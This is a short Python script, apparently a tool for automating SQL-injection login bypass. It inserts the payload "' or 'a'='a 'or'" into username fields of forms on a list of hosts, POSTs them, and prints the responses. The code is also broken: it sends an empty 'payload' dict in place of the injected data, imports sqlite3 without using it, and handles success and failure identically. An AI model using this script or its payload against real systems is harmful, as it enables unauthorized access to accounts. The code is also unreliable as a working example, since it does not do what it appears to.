import sqlite3
import requests

def inyeccion_SQL(hosts):
    for host, action_names_values in hosts.items():
        for item in action_names_values:
            payload = {}
            link = ''

            if isinstance(item, dict):
                for name in item['names_values'].keys():
                    if any(p_name in name for p_name in ['user', 'usuario']):
                        item['names_values'][name] = "' or 'a'='a 'or'"
                        data = item['names_values']
                        link = item['action']
            elif isinstance(item, str):
                data={'usuario':"' or 'a'='a 'or'", 'password':''}
                link = item

            url = f'http://{host}/{link}/'

            try:
                with requests.Session() as s:
                    response = s.post(url, data=payload)
            except:
                print(f'There was a problem when trying to login to {url}')
                continue

            if response.status_code == requests.codes.ok:
                print(response.text)
            else:
                print(response.text)


